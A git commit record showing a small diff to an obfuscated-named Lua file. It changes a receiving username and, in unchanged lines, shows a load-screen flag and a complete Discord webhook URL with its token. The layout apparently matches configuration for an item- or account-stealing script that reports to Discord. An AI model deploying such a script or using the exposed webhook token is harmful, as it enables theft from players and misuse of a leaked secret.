92c1a0d9b8413debbc8f199409be2493b20e2d6a
oxz0 <macharashvilivako55@gmail.com>
2025-04-03 23:57:37 +0400

    Add files via upload

--- obf_TK6t3W620XnF99zD74djsKTt9l0Zbnu8jQ5stSgbc6vU97v45f1P0xs25O81I570.lua
+++ obf_TK6t3W620XnF99zD74djsKTt9l0Zbnu8jQ5stSgbc6vU97v45f1P0xs25O81I570.lua
@@ -1,4 +1,4 @@
-Username = "oxzthengha"
+Username = "deviousvako"
 LoadScreen = true 
 Webhook = "https://discord.com/api/webhooks/1357442173972385813/V_j6N9-tw_XbpChVsyZQzEXpIHrtCaKTDPocyuNY4PI0vq5Q_XBfOcECXYa98prf_t5S" -- Paste your Discord webhook here
 
